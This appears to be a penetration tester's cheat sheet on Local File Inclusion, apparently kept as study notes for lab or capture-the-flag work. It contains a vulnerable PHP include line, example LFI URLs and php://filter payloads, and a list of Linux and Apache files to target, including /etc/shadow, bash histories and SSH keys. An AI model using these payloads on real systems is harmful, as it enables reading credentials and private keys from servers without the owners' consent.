# LFI Local_File_Inclusion #Important_file_loc

**LFI - Local File Inclusion**
Requirements: unchecked variable processed on page load
Examples: 
	* jscript - $err
	* `<?php $err ?>`
	* `<?PHP include($_GET["file"]);  ?>`

**Var Requirements**
	* if there is an variable on the page, try it
	* Try LFI as:
		* Clear text
		* url encoded
		* quoted in double or single quotes

**example LFI's:** 
    - `http://url/index.php?err=[lfi]`
    - `http://example.com/index.php?file=/etc/passwd`
    - message body injection via proxy  `varname=/etc/passwd`

**Encoding Methods if standard text does not work or page contains code. **
    - Rot13 - `http://example.thm.labs/page.php?file=filter/read=string.rot13/resource=/etc/passwd` 
    - Base64 - `http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd`
	- Many more, look them up... 
	- use cyberchef or cmdlets to decode quickly


**LINUX - Important OS Files:**
	- /etc/passwd - Validates if LFI will work in most cases
	- /etc/init.d
	- /etc/issue
	- /etc/shadow
	- /etc/group
	- /etc/hosts
	- /etc/motd
	- /etc/mysql/my.cnf
	- /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
	- /proc/self/environ
	- /proc/version
	- /proc/cmdline
	- /etc/rc.d
	- /etc/HOSTNAME 			- Servers host name info
	- /etc/network/interfaces 	- may have other networks connected that you can view / search
	- /etc/profile
	- /etc/apt/sources.list 	- list of all packages installed, may have some tools avail
	- /etc/resolv.conf			- name server config, reveal more servers or domain info 
	- /home/[user]/.bash_history - bash history, may reveal passwords for users
	- /root/.bash_history		- may find root password, or other network locations to target
	- ~/.ssh					- RSA keys for ssh login possible. 
	- /var/log					- log files, may have sensitive info or other absolute paths to view
	- /var/spool/cron			- All cron files 
	- /var/log/apache/access.log	- Connection log, absolute paths to items
	- /etc/fstab				- All attached storage

**LINUX - Apache default install locations** 
	- /var/apache2/
	- /etc/apache2/
	- /etc/httpd/
	- /etc/httpd/conf
	- /usr/local/...
	- /opt....

**Important Apache Files:**
	- /etc/init.d/apache2
	- /etc/init.d/httpd
	- apache2.conf
	- conf/http.conf
	- http.conf
	- .htaccess
	- ~/sites-available/
		- default
		- default.ssl
	- ~/sites-enabled/
	- ~/mods-available/
	- ~/mods-enabled/
	